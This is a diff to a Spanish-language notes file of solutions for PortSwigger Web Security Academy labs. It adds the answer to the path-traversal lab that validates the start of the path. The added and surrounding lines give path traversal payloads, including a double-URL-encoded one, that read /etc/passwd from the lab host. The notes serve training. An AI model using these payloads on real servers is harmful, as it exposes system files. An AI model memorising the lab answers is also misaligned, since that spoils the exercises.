@@ -109,6 +109,12 @@ Hacer una request a https://LABID.web-security-academy.net/image?filename=....//
 
 Hacer una request a https://LABID.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd
 
+### [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
+
 ---
 
 ## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
